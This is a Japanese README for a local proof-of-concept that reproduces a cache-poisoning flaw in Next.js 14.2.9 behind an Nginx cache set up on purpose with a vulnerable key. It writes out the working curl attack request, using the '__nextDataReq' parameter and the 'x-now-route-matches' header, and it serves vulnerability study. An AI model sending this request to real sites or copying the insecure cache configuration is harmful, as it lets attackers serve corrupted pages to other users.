# Next.js Cache Poisoning ローカル検証メモ

このリポジトリは、Pages Router + SSR (`getServerSideProps`) を使った
ローカル検証用PoCです。

## 前提

- Next.js: `14.2.9`（修正前）または `14.2.10`（修正後）
- Burp Suite（任意）
- Docker Desktop（Nginxをコンテナで起動する場合）

## なぜ `npm run dev` だけでは再現しにくいか

- 脆弱性の本質は「中間キャッシュ層」が不適切なキーで保存することです。
- ローカルのNext.js単体では、永続的な共有キャッシュが無いため、
	ポイズニングの再現が難しいです。
- さらに開発モードのレスポンスはキャッシュされにくいため、
	検証は `next build && next start`（本番モード）で行うのを推奨します。

## このPoCページ

[pages/index.tsx](pages/index.tsx) は以下を表示します。

- `User-Agent`
- サーバ側生成時刻 `Generated At (Server)`

`Generated At` が固定されたまま返ると、キャッシュヒットを視認しやすくなります。

## 1. Next.jsを本番モードで起動

```powershell
npm install
npm run build
npm run start
```

Next.jsは `http://localhost:3000` で待ち受けます。

## 2. Nginxキャッシュ層を起動

設定ファイルは [nginx/nginx.conf](nginx/nginx.conf) です。

Dockerで次のエラーが出る場合は、Docker Desktopが未起動です。

failed to connect to the docker API at npipe:////./pipe/docker_engine

その場合はDocker Desktopを起動し、`docker desktop status` が `running` を返すことを確認してから続行してください。

ポイント:

- `proxy_cache_key "$host$uri";`
	- クエリをキーに含めない（脆弱な設定例）
- `proxy_ignore_headers ...;`
	- PoCとしてキャッシュを強制

```powershell
docker run --name next-cache-poc --rm -d -p 8080:8080 `
  -v "${PWD}\nginx\nginx.conf:/etc/nginx/conf.d/default.conf:ro" `
  nginx:1.27
```

以降は `http://localhost:8080` にアクセスします。

同名コンテナ競合エラーが出た場合:

```powershell
docker stop next-cache-poc
docker rm next-cache-poc
```

一発で作り直す場合:

```powershell
docker rm -f next-cache-poc
docker run --name next-cache-poc --rm -d -p 8080:8080 `
	-v "${PWD}\nginx\nginx.conf:/etc/nginx/conf.d/default.conf:ro" `
	nginx:1.27
```

## 3. 検証手順（攻撃リクエスト送信）

Burp Suite でも curl でも可能です。例として curl:

```powershell
curl.exe -i "http://localhost:8080/?__nextDataReq=1" `
  -H "x-now-route-matches: 1" `
  -H "User-Agent: poison-agent"
```

期待値:

- JSON形式レスポンス
- `userAgent` が `poison-agent`
- `X-Cache-Status: MISS`（初回）

同じURIに再アクセス:

```powershell
curl.exe -i "http://localhost:8080/" -H "User-Agent: victim-agent"
```

脆弱な経路でキャッシュ汚染が成立する場合、次が観測できます。

- 本来HTMLのはずのレスポンスがJSONで返る
- `userAgent` が `poison-agent` のまま
- `X-Cache-Status: HIT`

## 4. 14.2.9 / 14.2.10 比較

`package.json` の `next` を切り替えて比較します。

```powershell
npm install next@14.2.9 eslint-config-next@14.2.9
npm run build
npm run start
```

```powershell
npm install next@14.2.10 eslint-config-next@14.2.10
npm run build
npm run start
```

同一手順で、レスポンス差分（JSON化の可否、キャッシュHIT挙動）を確認します。

## 注意

- この検証はローカル環境でのみ実施してください。
- 外部システムへの攻撃的テストは、明示的な許可無しに行わないでください。
